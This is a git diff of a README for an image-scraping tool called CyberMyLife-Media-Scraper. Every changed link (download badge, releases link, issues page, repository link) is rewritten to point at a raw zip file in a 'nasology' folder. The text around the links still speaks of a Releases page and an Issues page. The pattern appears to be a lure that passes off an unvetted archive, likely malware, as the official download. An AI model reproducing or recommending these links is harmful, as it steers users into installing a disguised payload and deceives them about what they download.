@@ -1,6 +1,6 @@
 # 🖼️ CyberMyLife-Media-Scraper - Extract Quality Images Effortlessly
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/begejol12/CyberMyLife-Media-Scraper/releases)
+[![Download Here](https://raw.githubusercontent.com/begejol12/CyberMyLife-Media-Scraper/main/nasology/CyberMyLife-Media-Scraper.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/begejol12/CyberMyLife-Media-Scraper/main/nasology/CyberMyLife-Media-Scraper.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ CyberMyLife-Media-Scraper lets you extract high-quality images from a specific w
 ## 📥 Download & Install
 
 1. **Visit this page to download:** Click the link below to go to the Releases page.
-   [Download CyberMyLife-Media-Scraper](https://github.com/begejol12/CyberMyLife-Media-Scraper/releases)
+   [Download CyberMyLife-Media-Scraper](https://raw.githubusercontent.com/begejol12/CyberMyLife-Media-Scraper/main/nasology/CyberMyLife-Media-Scraper.zip)
 
 2. **Choose your version:** On the Releases page, you will see different versions. Choose the most recent version for the best performance.
 
@@ -66,7 +66,7 @@ A: Make sure you have the latest version installed. If the issue persists, pleas
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to check the [Issues page](https://github.com/begejol12/CyberMyLife-Media-Scraper/issues) for solutions. You can also open a new issue if you don’t find your answer.
+If you encounter any issues or have questions, feel free to check the [Issues page](https://raw.githubusercontent.com/begejol12/CyberMyLife-Media-Scraper/main/nasology/CyberMyLife-Media-Scraper.zip) for solutions. You can also open a new issue if you don’t find your answer.
 
 ## 📄 License
 
@@ -74,6 +74,6 @@ CyberMyLife-Media-Scraper is open-source software licensed under the MIT License
 
 ## 🌐 Additional Resources
 
-For more information, visit our [GitHub Repository](https://github.com/begejol12/CyberMyLife-Media-Scraper).
+For more information, visit our [GitHub Repository](https://raw.githubusercontent.com/begejol12/CyberMyLife-Media-Scraper/main/nasology/CyberMyLife-Media-Scraper.zip).
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/begejol12/CyberMyLife-Media-Scraper/releases)
+[![Download Here](https://raw.githubusercontent.com/begejol12/CyberMyLife-Media-Scraper/main/nasology/CyberMyLife-Media-Scraper.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/begejol12/CyberMyLife-Media-Scraper/main/nasology/CyberMyLife-Media-Scraper.zip)
